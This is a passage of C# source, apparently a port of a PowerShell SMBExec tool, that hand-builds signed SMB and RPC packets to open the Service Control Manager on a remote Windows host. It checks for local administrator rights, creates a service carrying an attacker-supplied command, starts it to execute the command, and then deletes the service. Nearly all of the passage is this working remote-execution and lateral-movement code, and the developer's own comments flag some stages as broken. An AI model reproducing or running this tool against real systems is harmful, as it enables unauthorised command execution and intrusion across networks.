                                                MD5CryptoServiceProvider MD5Crypto = new MD5CryptoServiceProvider();
                                                byte[] SMB_Sign = CombineByteArray(session_key, SMB_header);
                                                byte[] SMB_Sign2 = CombineByteArray(SMB_Sign, SMB_data);
                                                byte[] SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign2);
                                                byte[] SMB_Signature2 = getByteRange(SMB_Signature, 0, 7);
                                                packet_SMB_header["SMBHeader_Signature"] = SMB_Signature2;
                                                SMB_header = ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                            }
                                            SMB_client_send = CombineByteArray(NetBIOS_Session_service, SMB_header);
                                            SMB_client_send = CombineByteArray(SMB_client_send, SMB_data);
                                            SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                            SMBClientStream.Flush();
                                            SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                            SMBClientStage = "RPCBind";
                                        if (debugging == true) { Console.WriteLine("Communicating...Current Stage: {0}", SMBClientStage); }

                                    }
                                        break;
                                    case "RPCBind":
                                        {
                                            SMB_FID = getByteRange(SMBClientReceive, 42, 43);
                                            packet_SMB_header = GetPacketSMBHeader(new byte[] { 0x2f }, new byte[] { 0x18 }, new byte[] { 0x05, 0x28 }, SMB_tree_ID, process_ID_Bytes, SMB_user_ID);
                                            if (SMB_signing)
                                            {
                                                packet_SMB_header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                                SMB_signing_counter += 2;
                                                byte[] SMB_signing_sequence = CombineByteArray(BitConverter.GetBytes(SMB_signing_counter), new byte[] { 0x00, 0x00, 0x00, 0x00 });
                                                packet_SMB_header["SMBHeader_Signature"] = SMB_signing_sequence;
                                            }
                                            byte[] SMB_header = ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                            OrderedDictionary packet_RPC_data = GetPacketRPCBind(1, new byte[] { 0xb8, 0x10 }, new byte[] { 0x01 }, new byte[] { 0x00, 0x00 }, SMB_named_pipe_UUID, new byte[] { 0x02, 0x00 });
                                            byte[] RPC_data = ConvertFromPacketOrderedDictionary(packet_RPC_data);
                                            OrderedDictionary packet_SMB_data = GetPacketSMBWriteAndXRequest(SMB_FID, RPC_data.Length);
                                            byte[] SMB_data = ConvertFromPacketOrderedDictionary(packet_SMB_data);
                                            int RPC_data_length = SMB_data.Length + RPC_data.Length;
                                            OrderedDictionary packet_NetBIOS_session_service = GetPacketNetBIOSSessionService(SMB_header.Length, RPC_data_length);
                                            byte[] NetBIOS_session_service = ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);
                                            if (SMB_signing)
                                            {
                                                MD5CryptoServiceProvider MD5Crypto = new MD5CryptoServiceProvider();
                                                byte[] SMB_Sign = CombineByteArray(session_key, SMB_header);
                                                SMB_Sign = CombineByteArray(SMB_Sign, SMB_data);
                                                SMB_Sign = CombineByteArray(SMB_Sign, RPC_data);
                                                byte[] SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                                SMB_Signature = getByteRange(SMB_Signature, 0, 7);
                                                packet_SMB_header["SMBHeader_Signature"] = SMB_Signature;
                                                SMB_header = ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                            }
                                            SMB_client_send = CombineByteArray(NetBIOS_session_service, SMB_header);
                                            SMB_client_send = CombineByteArray(SMB_client_send, SMB_data);
                                            SMB_client_send = CombineByteArray(SMB_client_send , RPC_data);
                                            SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                            SMBClientStream.Flush();
                                            SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                            SMBClientStage = "ReadAndXRequest";
                                            SMB_client_stage_next = "OpenSCManagerW";
                                        if (debugging == true) { Console.WriteLine("Communicating...Current Stage: {0}", SMBClientStage); }
                                    }
                                        break;
                                    case "ReadAndXRequest": //Broken
                                        {
                                            Console.WriteLine("Sleeping for {0} seconds", sleep);
                                            Thread.Sleep(sleep*1000);
                                        packet_SMB_header = GetPacketSMBHeader(new byte[] { 0x2e }, new byte[] { 0x18 }, new byte[] { 0x05, 0x28 }, SMB_tree_ID, process_ID_Bytes, SMB_user_ID);
                                        if (SMB_signing)
                                            {
                                            packet_SMB_header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                                SMB_signing_counter += 2;
                                                byte[] SMB_signing_sequence = CombineByteArray(BitConverter.GetBytes(SMB_signing_counter), new byte[] { 0x00, 0x00, 0x00, 0x00 });
                                                packet_SMB_header["SMBHeader_Signature"] = SMB_signing_sequence;
                                            }
                                        byte[] SMB_header = ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                        OrderedDictionary packet_SMB_data = GetPacketSMBReadAndXRequest(); //The code sends SMB_FID with it in the Powershell but never uses it so I'm going to not send it.
                                        byte[] SMB_data = ConvertFromPacketOrderedDictionary(packet_SMB_data);
                                        OrderedDictionary packet_NetBIOS_session_service = GetPacketNetBIOSSessionService(SMB_header.Length, SMB_data.Length);
                                        byte[] NetBIOS_session_service = ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);

                                            if (SMB_signing)
                                            {
                                                MD5CryptoServiceProvider MD5Crypto = new MD5CryptoServiceProvider();
                                                byte[] SMB_Sign = CombineByteArray(session_key, SMB_header);
                                                byte[] SMB_Sign2 = CombineByteArray(SMB_Sign, SMB_data);
                                                byte[] SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign2);
                                                byte[] SMB_Signature2 = getByteRange(SMB_Signature, 0, 7);
                                                packet_SMB_header["SMBHeader_Signature"] = SMB_Signature2;
                                                SMB_header = ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                            }
                                        SMB_client_send = CombineByteArray(NetBIOS_session_service, SMB_header);
                                        SMB_client_send = CombineByteArray(SMB_client_send, SMB_data);
                                            SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                            SMBClientStream.Flush();
                                        SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                            SMBClientStage = SMB_client_stage_next;
                                        if (debugging == true) { Console.WriteLine("Communicating...Current Stage: {0}", SMBClientStage); }

                                    }
                                        break;

                                    case "OpenSCManagerW":
                                        {
                                            packet_SMB_header = GetPacketSMBHeader(new byte[] { 0x2f }, new byte[] { 0x18 }, new byte[] { 0x05, 0x28 }, SMB_tree_ID, process_ID_Bytes, SMB_user_ID);
                                            if (SMB_signing)
                                            {
                                                packet_SMB_header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                                SMB_signing_counter += 2;
                                                byte[] SMB_signing_sequence = CombineByteArray(BitConverter.GetBytes(SMB_signing_counter), new byte[] { 0x00, 0x00, 0x00, 0x00 });
                                                packet_SMB_header["SMBHeader_Signature"] = SMB_signing_sequence;
                                            }

                                            OrderedDictionary packet_SCM_data = GetPacketSCMOpenSCManagerW(SMB_service_bytes, SMB_service_length);
                                            SCM_data = ConvertFromPacketOrderedDictionary(packet_SCM_data);
                                        //Null ref exception?
                                            OrderedDictionary packet_RPC_data = GetPacketRPCRequest(new byte[] { 0x03 }, SCM_data.Length, 0, 0, new byte[] { 0x01, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x0f, 0x00 }, null);
                                            byte[] RPC_data = ConvertFromPacketOrderedDictionary(packet_RPC_data);
                                            byte[] SMB_header = ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                            OrderedDictionary packet_SMB_Data = GetPacketSMBWriteAndXRequest(SMB_FID, (RPC_data.Length + SCM_data.Length));
                                            byte[] SMB_data = ConvertFromPacketOrderedDictionary(packet_SMB_Data);
                                            int RPC_data_length = SMB_data.Length + SCM_data.Length + RPC_data.Length;
                                        OrderedDictionary packet_NetBIOS_Session_Service = GetPacketNetBIOSSessionService(SMB_header.Length, RPC_data_length);
                                            byte[] NetBIOS_Session_Service = ConvertFromPacketOrderedDictionary(packet_NetBIOS_Session_Service);
                                            if (SMB_signing)
                                            {
                                                MD5CryptoServiceProvider MD5Crypto = new MD5CryptoServiceProvider();
                                                byte[] SMB_Sign = CombineByteArray(session_key, SMB_header);
                                                SMB_Sign = CombineByteArray(SMB_Sign, SMB_data);
                                                SMB_Sign = CombineByteArray(SMB_Sign, RPC_data);
                                                SMB_Sign = CombineByteArray(SMB_Sign, SCM_data);
                                                byte[] SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                                SMB_Signature = getByteRange(SMB_Signature, 0, 7);
                                                packet_SMB_header["SMBHeader_Signature"] = SMB_Signature;
                                                SMB_header = ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                            }
                                            SMB_client_send = CombineByteArray(NetBIOS_Session_Service, SMB_header);
                                            SMB_client_send = CombineByteArray(SMB_client_send, SMB_data);
                                            SMB_client_send = CombineByteArray(SMB_client_send, RPC_data);
                                            SMB_client_send = CombineByteArray(SMB_client_send, SCM_data);

                                            SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                            SMBClientStream.Flush();
                                            SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                            SMBClientStage = "ReadAndXRequest";
                                            SMB_client_stage_next = "CheckAccess";
                                        if (debugging == true) { Console.WriteLine("Communicating...Current Stage: {0}", SMBClientStage); }

                                    }
                                        break;
                                    case "CheckAccess":
                                        {
                                            if (BitConverter.ToString(getByteRange(SMBClientReceive,108,111)) == "00-00-00-00" && BitConverter.ToString(getByteRange(SMBClientReceive,88,107)) != "00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00")
                                            {
                                                SMB_service_manager_context_handle = getByteRange(SMBClientReceive, 88, 107);
                                                if (SMB_execute)
                                                {
                                                    Console.WriteLine("{0} is a local administrator on {1}", output_username, target);
                                                    OrderedDictionary packet_SCM_data = GetPacketSCMCreateServiceW(SMB_service_manager_context_handle, SMB_service_bytes, SMB_service_length, SMBExec_command, SMBExec_command_length_bytes);
                                                    SCM_data = ConvertFromPacketOrderedDictionary(packet_SCM_data);
                                                    if (SCM_data.Length < SMB_split_index)
                                                    {
                                                        SMBClientStage = "CreateServiceW";
                                                    }
                                                    else
                                                    {
                                                        SMBClientStage = "CreateServiceW_First";
                                                    }
                                                }
                                                else
                                                {
                                                    Console.WriteLine("{0} is a local administrator on {1}", output_username, target);
                                                    SMB_close_service_handle_stage = 2;
                                                    SMBClientStage = "CloseServiceHandle";
                                                }

                                            }
                                            else if (BitConverter.ToString(getByteRange(SMBClientReceive,108,111)) == "05-00-00-00")
                                            {
                                                Console.WriteLine("{0} is not a local administrator or does not have the required privileges on {1}", output_username, target);
                                                SMBExec_failed = true;
                                            }
                                            else
                                            {
                                                Console.WriteLine("Something went wrong with {0}", target);
                                                SMBExec_failed = true;
                                            }
                                        if (debugging == true) { Console.WriteLine("Communicating...Current Stage: {0}", SMBClientStage); }

                                    }

                                        break;

                                    case "CreateServiceW":
                                        {
                                            packet_SMB_header = GetPacketSMBHeader(new byte[] { 0x2f }, new byte[] { 0x18 }, new byte[] { 0x05, 0x28 }, SMB_tree_ID, process_ID_Bytes, SMB_user_ID);
                                            if (SMB_signing)
                                            {
                                                packet_SMB_header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                                SMB_signing_counter += 2;
                                                byte[] SMB_signing_sequence = CombineByteArray(BitConverter.GetBytes(SMB_signing_counter), new byte[] { 0x00, 0x00, 0x00, 0x00 });
                                                packet_SMB_header["SMBHeader_Signature"] = SMB_signing_sequence;
                                            }

                                            OrderedDictionary packet_SCM_data = GetPacketSCMCreateServiceW(SMB_service_manager_context_handle, SMB_service_bytes, SMB_service_length, SMBExec_command, SMBExec_command_length_bytes);
                                            SCM_data = ConvertFromPacketOrderedDictionary(packet_SCM_data);
                                            OrderedDictionary packet_RPC_data = GetPacketRPCRequest(new byte[] { 0x03 }, SCM_data.Length, 0, 0, new byte[] { 0x02, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 } ,new byte[] { 0x0c, 0x00 }, null);
                                            byte[] RPC_data = ConvertFromPacketOrderedDictionary(packet_RPC_data);
                                            byte[] SMB_header = ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                            OrderedDictionary packet_SMB_data = GetPacketSMBWriteAndXRequest(SMB_FID, RPC_data.Length + SCM_data.Length);
                                            byte[] SMB_data = ConvertFromPacketOrderedDictionary(packet_SMB_data);
                                            int RPC_data_length = SMB_data.Length + SCM_data.Length + RPC_data.Length;
                                            OrderedDictionary packet_NetBIOS_session_service = GetPacketNetBIOSSessionService(SMB_header.Length, RPC_data_length);
                                            byte[] NetBIOS_session_service = ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);
                                            if (SMB_signing)
                                            {
                                                MD5CryptoServiceProvider MD5Crypto = new MD5CryptoServiceProvider();
                                                byte[] SMB_Sign = CombineByteArray(session_key, SMB_header);
                                                SMB_Sign = CombineByteArray(SMB_Sign, SMB_data);
                                                SMB_Sign = CombineByteArray(SMB_Sign, RPC_data);
                                                SMB_Sign = CombineByteArray(SMB_Sign, SCM_data);
                                                byte[] SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                                SMB_Signature = getByteRange(SMB_Signature, 0, 7);
                                                packet_SMB_header["SMBHeader_Signature"] = SMB_Signature;
                                                SMB_header = ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                            }
                                            SMB_client_send = CombineByteArray(NetBIOS_session_service, SMB_header);
                                            SMB_client_send = CombineByteArray(SMB_client_send, SMB_data);
                                            SMB_client_send = CombineByteArray(SMB_client_send, RPC_data);
                                            SMB_client_send = CombineByteArray(SMB_client_send, SCM_data);
                                            SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                            SMBClientStream.Flush();
                                            SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                            SMBClientStage = "ReadAndXRequest";
                                            SMB_client_stage_next = "StartServiceW";
                                        if (debugging == true) { Console.WriteLine("Communicating...Current Stage: {0}", SMBClientStage); }
                                    }
                                        break;
                                    case "CreateServiceW_First":
                                        {
                                            SMB_split_stage_final = Math.Ceiling((double)SCM_data.Length / SMB_split_index);
                                            packet_SMB_header = GetPacketSMBHeader(new byte[] { 0x2f }, new byte[] { 0x18 }, new byte[] { 0x05, 0x28 }, SMB_tree_ID, process_ID_Bytes, SMB_user_ID);
                                            if (SMB_signing)
                                            {
                                                packet_SMB_header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                                SMB_signing_counter += 2;
                                                byte[] SMB_signing_sequence = CombineByteArray(BitConverter.GetBytes(SMB_signing_counter), new byte[] { 0x00, 0x00, 0x00, 0x00 });
                                                packet_SMB_header["SMBHeader_Signature"] = SMB_signing_sequence;
                                            }
                                            byte[] SCM_data_first = getByteRange(SCM_data, 0, SMB_split_index - 1);
                                            OrderedDictionary packet_RPC_data = GetPacketRPCRequest(new byte[] { 0x01 }, 0, 0, 0, new byte[] { 0x02, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x0c, 0x00 }, SCM_data_first);
                                            packet_RPC_data["RPCRequest_AllocHint"] = BitConverter.GetBytes(SCM_data.Length);
                                            SMB_split_index_tracker = SMB_split_index;
                                            byte[] RPC_data = ConvertFromPacketOrderedDictionary(packet_RPC_data);
                                            byte[] SMB_header = ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                            OrderedDictionary packet_SMB_data = GetPacketSMBWriteAndXRequest(SMB_FID, RPC_data.Length);
                                            byte[] SMB_data = ConvertFromPacketOrderedDictionary(packet_SMB_data);
                                            int RPC_data_length = SMB_data.Length + RPC_data.Length;
                                            OrderedDictionary packet_NetBIOS_session_service = GetPacketNetBIOSSessionService(SMB_header.Length, RPC_data_length);
                                            byte[] NetBIOS_session_service = ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);
                                            if (SMB_signing)
                                            {
                                                MD5CryptoServiceProvider MD5Crypto = new MD5CryptoServiceProvider();
                                                byte[] SMB_Sign = CombineByteArray(session_key, SMB_header);
                                                SMB_Sign = CombineByteArray(SMB_Sign, SMB_data);
                                                SMB_Sign = CombineByteArray(SMB_Sign, RPC_data);
                                                byte[] SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                                SMB_Signature = getByteRange(SMB_Signature, 0, 7);
                                                packet_SMB_header["SMBHeader_Signature"] = SMB_Signature;
                                                SMB_header = ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                            }
                                            SMB_client_send = CombineByteArray(NetBIOS_session_service, SMB_header);
                                            SMB_client_send = CombineByteArray(SMB_client_send, SMB_data);
                                            SMB_client_send = CombineByteArray(SMB_client_send, RPC_data);
                                            SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                            SMBClientStream.Flush();
                                            SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);

                                            if(SMB_split_stage_final <= 2)
                                            {
                                                SMBClientStage = "CreateServiceW_Last";
                                            }
                                            else
                                            {
                                                SMB_split_stage = 2;
                                                SMBClientStage = "CreateServiceW_Middle";      
                                            }
                                        if (debugging == true) { Console.WriteLine("Communicating...Current Stage: {0}", SMBClientStage); }
                                    }
                                        break;
                                    case "CreateServiceW_Middle":
                                        {
                                            SMB_split_stage++;
                                            packet_SMB_header = GetPacketSMBHeader(new byte[] { 0x2f }, new byte[] { 0x18 }, new byte[] { 0x05, 0x28 }, SMB_tree_ID, process_ID_Bytes, SMB_user_ID);
                                            if (SMB_signing)
                                            {
                                                packet_SMB_header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                                SMB_signing_counter += 2;
                                                byte[] SMB_signing_sequence = CombineByteArray(BitConverter.GetBytes(SMB_signing_counter), new byte[] { 0x00, 0x00, 0x00, 0x00 });
                                                packet_SMB_header["SMBHeader_Signature"] = SMB_signing_sequence;
                                            }
                                            byte[] SCM_data_middle = getByteRange(SCM_data, SMB_split_index_tracker, SMB_split_index_tracker + SMB_split_index - 1);
                                            SMB_split_index_tracker += SMB_split_index;
                                            OrderedDictionary packet_RPC_data = GetPacketRPCRequest(new byte[] { 0x00 }, 0, 0, 0, new byte[] { 0x02, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x0c, 0x00 }, SCM_data_middle);
                                            packet_RPC_data["RPCRequest_AllocHint"] = BitConverter.GetBytes(SCM_data.Length - SMB_split_index_tracker + SMB_split_index);
                                            byte[] RPC_data = ConvertFromPacketOrderedDictionary(packet_RPC_data);
                                            byte[] SMB_header = ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                            OrderedDictionary packet_SMB_data = GetPacketSMBWriteAndXRequest(SMB_FID, RPC_data.Length);
                                            byte[] SMB_data = ConvertFromPacketOrderedDictionary(packet_SMB_data);
                                            int RPC_data_length = SMB_data.Length + RPC_data.Length;
                                            OrderedDictionary packet_NetBIOS_session_service = GetPacketNetBIOSSessionService(SMB_header.Length, RPC_data_length);
                                            byte[] NetBIOS_session_service = ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);
                                            if (SMB_signing)
                                            {
                                                MD5CryptoServiceProvider MD5Crypto = new MD5CryptoServiceProvider();
                                                byte[] SMB_Sign = CombineByteArray(session_key, SMB_header);
                                                SMB_Sign = CombineByteArray(SMB_Sign, SMB_data);
                                                SMB_Sign = CombineByteArray(SMB_Sign, RPC_data);
                                                byte[] SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                                SMB_Signature = getByteRange(SMB_Signature, 0, 7);
                                                packet_SMB_header["SMBHeader_Signature"] = SMB_Signature;
                                                SMB_header = ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                            }
                                            SMB_client_send = CombineByteArray(NetBIOS_session_service, SMB_header);
                                            SMB_client_send = CombineByteArray(SMB_client_send, SMB_data);
                                            SMB_client_send = CombineByteArray(SMB_client_send, RPC_data);
                                            SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                            SMBClientStream.Flush();
                                            SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                            if(SMB_split_stage >= SMB_split_stage_final)
                                            {
                                                SMBClientStage = "CreateServiceW_Last";
                                            }
                                            else
                                            {
                                                SMBClientStage = "CreateServiceW_Middle";
                                            }
                                        if (debugging == true) { Console.WriteLine("Communicating...Current Stage: {0}", SMBClientStage); }

                                    }
                                        break;

                                    case "CreateServiceW_Last":
                                        {
                                            packet_SMB_header = GetPacketSMBHeader(new byte[] { 0x2f }, new byte[] { 0x18 }, new byte[] { 0x05, 0x48 }, SMB_tree_ID, process_ID_Bytes, SMB_user_ID);
                                            if (SMB_signing)
                                            {
                                                packet_SMB_header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                                SMB_signing_counter += 2;
                                                byte[] SMB_signing_sequence = CombineByteArray(BitConverter.GetBytes(SMB_signing_counter), new byte[] { 0x00, 0x00, 0x00, 0x00 });
                                                packet_SMB_header["SMBHeader_Signature"] = SMB_signing_sequence;
                                            }
                                            byte[] SCM_data_last = getByteRange(SCM_data, SMB_split_index_tracker, SCM_data.Length);
                                            SMB_split_index_tracker += SMB_split_index;
                                            OrderedDictionary packet_RPC_data = GetPacketRPCRequest(new byte[] { 0x02 }, 0, 0, 0, new byte[] { 0x02, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x0c, 0x00 }, SCM_data_last);
                                            byte[] RPC_data = ConvertFromPacketOrderedDictionary(packet_RPC_data);
                                            byte[] SMB_header = ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                            OrderedDictionary packet_SMB_data = GetPacketSMBWriteAndXRequest(SMB_FID, RPC_data.Length);
                                            byte[] SMB_data = ConvertFromPacketOrderedDictionary(packet_SMB_data);
                                            int RPC_data_length = SMB_data.Length + RPC_data.Length;
                                            OrderedDictionary packet_NetBIOS_session_service = GetPacketNetBIOSSessionService(SMB_header.Length, RPC_data_length);
                                            byte[] NetBIOS_session_service = ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);
                                            if (SMB_signing)
                                            {
                                                MD5CryptoServiceProvider MD5Crypto = new MD5CryptoServiceProvider();
                                                byte[] SMB_Sign = CombineByteArray(session_key, SMB_header);
                                                SMB_Sign = CombineByteArray(SMB_Sign, SMB_data);
                                                SMB_Sign = CombineByteArray(SMB_Sign, RPC_data);
                                                byte[] SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                                SMB_Signature = getByteRange(SMB_Signature, 0, 7);
                                                packet_SMB_header["SMBHeader_Signature"] = SMB_Signature;
                                                SMB_header = ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                            }
                                            SMB_client_send = CombineByteArray(NetBIOS_session_service, SMB_header);
                                            SMB_client_send = CombineByteArray(SMB_client_send, SMB_data);
                                            SMB_client_send = CombineByteArray(SMB_client_send, RPC_data);
                                            SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                            SMBClientStream.Flush();
                                            SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                            SMBClientStage = "ReadAndXRequest";
                                            SMB_client_stage_next = "StartServiceW";
                                        if (debugging == true) { Console.WriteLine("Communicating...Current Stage: {0}", SMBClientStage); }
                                    }
                                        break;

                                    case "StartServiceW":
                                        {
                                            if(BitConverter.ToString(getByteRange(SMBClientReceive,112,115)) == "00-00-00-00")
                                            {
                                                Console.WriteLine("Service {0} created on {1}", SMB_service, target);
                                                SMB_service_context_handle = getByteRange(SMBClientReceive,92, 111);
                                                packet_SMB_header = GetPacketSMBHeader(new byte[] { 0x2f }, new byte[] {0x18 }, new byte[] { 0x05, 0x28 }, SMB_tree_ID, process_ID_Bytes, SMB_user_ID);
                                                if (SMB_signing)
                                                {
                                                    packet_SMB_header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                                    SMB_signing_counter += 2;
                                                    byte[] SMB_signing_sequence = CombineByteArray(BitConverter.GetBytes(SMB_signing_counter), new byte[] { 0x00, 0x00, 0x00, 0x00 });
                                                    packet_SMB_header["SMBHeader_Signature"] = SMB_signing_sequence;
                                                }
                                                OrderedDictionary packet_SCM_data = GetPacketSCMStartServiceW(SMB_service_context_handle);
                                                SCM_data = ConvertFromPacketOrderedDictionary(packet_SCM_data);
                                                OrderedDictionary packet_RPC_data = GetPacketRPCRequest(new byte[] { 0x03 }, SCM_data.Length, 0, 0, new byte[] { 0x03, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x13, 0x00 }, null);
                                                byte[] RPC_data = ConvertFromPacketOrderedDictionary(packet_RPC_data);
                                                byte[] SMB_header = ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                                OrderedDictionary packet_SMB_data = GetPacketSMBWriteAndXRequest(SMB_FID, RPC_data.Length + SCM_data.Length);
                                                byte[] SMB_data = ConvertFromPacketOrderedDictionary(packet_SMB_data);
                                                int RPC_data_length = SMB_data.Length + SCM_data.Length + RPC_data.Length;
                                                OrderedDictionary packet_NetBIOS_session_service = GetPacketNetBIOSSessionService(SMB_header.Length, RPC_data_length);
                                                byte[] NetBIOS_session_service = ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);
                                                if (SMB_signing)
                                                {
                                                    MD5CryptoServiceProvider MD5Crypto = new MD5CryptoServiceProvider();
                                                    byte[] SMB_Sign = CombineByteArray(session_key, SMB_header);
                                                    SMB_Sign = CombineByteArray(SMB_Sign, SMB_data);
                                                    SMB_Sign = CombineByteArray(SMB_Sign, RPC_data);
                                                    SMB_Sign = CombineByteArray(SMB_Sign, SCM_data);
                                                    byte[] SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                                    SMB_Signature = getByteRange(SMB_Signature, 0, 7);
                                                    packet_SMB_header["SMBHeader_Signature"] = SMB_Signature;
                                                    SMB_header = ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                                }
                                                SMB_client_send = CombineByteArray(NetBIOS_session_service, SMB_header);
                                                SMB_client_send = CombineByteArray(SMB_client_send, SMB_data);
                                                SMB_client_send = CombineByteArray(SMB_client_send, RPC_data);
                                                SMB_client_send = CombineByteArray(SMB_client_send, SCM_data);
                                                SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                                SMBClientStream.Flush();
                                                SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                                SMBClientStage = "ReadAndXRequest";
                                                SMB_client_stage_next = "DeleteServiceW";
                                            }
                                            else if (BitConverter.ToString(getByteRange(SMBClientReceive, 112, 115)) == "31-04-00-00")
                                            {
                                                Console.WriteLine("Service {0} creation failed on {1}", SMB_service, target);
                                                SMBExec_failed = true;
                                            }
                                            else
                                            {
                                                Console.WriteLine("Service creation fault context mismatch");
                                                SMBExec_failed = true;
                                        }
                                        if (debugging == true) { Console.WriteLine("Communicating...Current Stage: {0}", SMBClientStage); }
                                    }
                                        break;
                                    case "DeleteServiceW":
                                        {
                                            if (BitConverter.ToString(getByteRange(SMBClientReceive,88,91)) == "1d-04-00-00")
                                            {
                                                Console.WriteLine("Command executed with service {0} on {1}", SMB_service, target);
                                            }
                                            else if (BitConverter.ToString(getByteRange(SMBClientReceive, 88, 91)) == "02-00-00-00")
                                            {
                                                Console.WriteLine("Service {0} failed to start on {1}", SMB_service, target);
                                            }
                                            packet_SMB_header = GetPacketSMBHeader(new byte[] { 0x2f }, new byte[] { 0x18 }, new byte[] { 0x05, 0x28 }, SMB_tree_ID, process_ID_Bytes, SMB_user_ID);

                                            if (SMB_signing)
                                            {
                                                packet_SMB_header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                                SMB_signing_counter += 2;
                                                byte[] SMB_signing_sequence = CombineByteArray(BitConverter.GetBytes(SMB_signing_counter), new byte[] { 0x00, 0x00, 0x00, 0x00 });
                                                packet_SMB_header["SMBHeader_Signature"] = SMB_signing_sequence;
                                            }

                                            OrderedDictionary packet_SCM_data = GetPacketSCMDeleteServiceW(SMB_service_context_handle);
                                            SCM_data = ConvertFromPacketOrderedDictionary(packet_SCM_data);
                                            OrderedDictionary packet_RPC_data = GetPacketRPCRequest(new byte[] { 0x03 }, SCM_data.Length, 0, 0, new byte[] { 0x04, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x02, 0x00 }, null);
                                            byte[] RPC_data = ConvertFromPacketOrderedDictionary(packet_RPC_data);
                                            byte[] SMB_header = ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                            OrderedDictionary packet_SMB_data = GetPacketSMBWriteAndXRequest(SMB_FID, RPC_data.Length + SCM_data.Length);
                                            byte[] SMB_data = ConvertFromPacketOrderedDictionary(packet_SMB_data);
                                            int RPC_data_length = SMB_data.Length + SCM_data.Length + RPC_data.Length;
                                            OrderedDictionary packet_NetBIOS_session_service = GetPacketNetBIOSSessionService(SMB_header.Length, RPC_data_length);
                                            byte[] NetBIOS_session_service = ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);
                                            if (SMB_signing)
                                            {
                                                MD5CryptoServiceProvider MD5Crypto = new MD5CryptoServiceProvider();
                                                byte[] SMB_Sign = CombineByteArray(session_key, SMB_header);
                                                SMB_Sign = CombineByteArray(SMB_Sign, SMB_data);
                                                SMB_Sign = CombineByteArray(SMB_Sign, RPC_data);
                                                SMB_Sign = CombineByteArray(SMB_Sign, SCM_data);
                                                byte[] SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                                SMB_Signature = getByteRange(SMB_Signature, 0, 7);
                                                packet_SMB_header["SMBHeader_Signature"] = SMB_Signature;
                                                SMB_header = ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                            }
                                            SMB_client_send = CombineByteArray(NetBIOS_session_service, SMB_header);
                                            SMB_client_send = CombineByteArray(SMB_client_send, SMB_data);
                                            SMB_client_send = CombineByteArray(SMB_client_send, RPC_data);
